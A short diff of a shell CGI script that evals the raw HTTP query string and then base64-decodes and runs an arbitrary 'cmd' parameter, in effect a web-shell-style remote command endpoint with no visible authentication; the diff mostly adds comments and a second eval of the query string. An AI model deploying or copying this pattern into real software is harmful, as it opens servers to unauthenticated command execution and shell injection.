@@ -9,9 +9,14 @@ Pragma: no-cache
 
 # parse parameters from query string
 eval $(echo ${QUERY_STRING//&/;})
+[ -n "$QUERY_STRING" ] && eval $(echo "$QUERY_STRING" | sed "s/&/;/g")
+
+# exit if no command sent
 
 # restore command from Base64 data
-c=$(echo $cmd|base64 -d)
+c=$(echo $cmd | base64 -d)
+
+# exit if command is empty
 [ -z "$c" ] && echo "No command!" && exit
 
 prompt() {
@@ -19,7 +24,7 @@ prompt() {
 }
 
 export PATH=/usr/local/bin:/usr/local/sbin:/bin:/sbin:/usr/bin:/usr/sbin
-cd /tmp
+cd /tmp || return
 prompt "$c\n"
 eval $c 2>&1
 
